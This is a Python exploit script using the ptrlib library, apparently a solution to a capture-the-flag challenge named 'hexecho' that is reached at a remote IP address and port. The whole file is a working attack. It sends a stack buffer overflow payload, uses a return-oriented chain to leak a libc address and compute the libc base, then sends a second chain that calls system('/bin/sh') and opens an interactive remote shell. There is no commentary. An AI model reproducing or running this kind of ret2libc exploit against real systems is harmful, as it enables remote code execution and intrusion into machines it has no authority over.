from ptrlib import *

elf = ELF("./hexecho")

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

# sock = Process("./hexecho")
sock = Socket("nc 34.170.146.252 51786")
# sock.debug = True


def hexecho(n):
    hexstr = hex(n)[2:].zfill(16)
    return "".join([hexstr[i : i + 2] for i in range(0, len(hexstr), 2)][::-1]).encode()


payload = b"A" * 0x210
payload += b"+" * 0x9
payload += b"B" * 0xF
payload += hexecho(next(elf.gadget("ret;")))
payload += hexecho(elf.symbol("main"))
payload += b"s"
sock.sendlineafter("Size: ", 0x1000)
sock.sendlineafter("Data (hex): ", payload)

leak = int("".join((sock.recvline()[0x562:0x573]).decode().split()[::-1]), 16)
logger.info("__libc_start_main+128 = " + hex(leak))
libc.base = leak - libc.symbol("__libc_start_main") - 0x80

payload = b"A" * 0x210
payload += b"+" * 0x9
payload += b"B" * 0xF
payload += hexecho(next(libc.gadget("pop rdi; ret;")))
payload += hexecho(next(libc.search("/bin/sh")))
payload += hexecho(next(libc.gadget("ret;")))
payload += hexecho(libc.symbol("system"))
payload += b"s"
sock.sendlineafter("Size: ", 0x1000)
sock.sendlineafter("Data (hex): ", payload)
sock.recvline()

sock.sh()
